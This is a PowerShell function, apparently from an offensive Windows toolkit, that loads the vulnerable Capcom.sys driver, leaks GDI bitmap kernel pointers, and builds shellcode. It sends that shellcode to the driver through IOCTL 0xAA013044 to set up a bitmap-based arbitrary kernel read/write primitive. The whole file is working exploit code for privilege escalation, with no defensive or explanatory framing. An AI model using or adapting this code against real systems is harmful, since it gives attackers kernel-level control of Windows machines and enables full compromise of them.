function Capcom-StageGDI {

	# Check if the Capcom driver is loaded
	$SystemModuleCapcom = Get-LoadedModules |Where-Object {$_.ImageName -Like "*Capcom*"}
	if (!$SystemModuleCapcom) {
		Write-Output "`n[+] Loading Capcom driver.."
		Load-CapcomDriver -Path $($PSScriptRoot + "\..\Driver\Capcom.sys")
		if ($DriverNotLoaded -eq $true) {
			Return
		}
	}

	# Leak BitMap pointers
	$Global:ManagerBitmap = Stage-gSharedInfoBitmap
	$Global:WorkerBitmap = Stage-gSharedInfoBitmap
	
	# Shellcode buffer
	[Byte[]] $Shellcode = @(
		0x48, 0xB8) + [System.BitConverter]::GetBytes($ManagerBitmap.BitmappvScan0) + @( # mov rax,$ManagerBitmap.BitmappvScan0
		0x48, 0xB9) + [System.BitConverter]::GetBytes($WorkerBitmap.BitmappvScan0)  + @( # mov rcx,$WorkerBitmap.BitmappvScan0
		0x48, 0x89, 0x08,                                                                # mov qword ptr [rax],rcx
		0xC3                                                                             # ret
	)

	# Some tricks here
	# => cmp [rax-8], rcx
	[IntPtr]$Pointer = [Capcom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
	$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
	[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
	
	$hDevice = [Capcom]::CreateFile("\\.\Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

	if ($hDevice -eq -1) {
		Write-Output "`n[!] Unable to get driver handle..`n"
		Return
	}
	
	# IOCTL = 0xAA013044
	#---
	$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
	$OutBuff = 0x1234
	[Capcom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null
}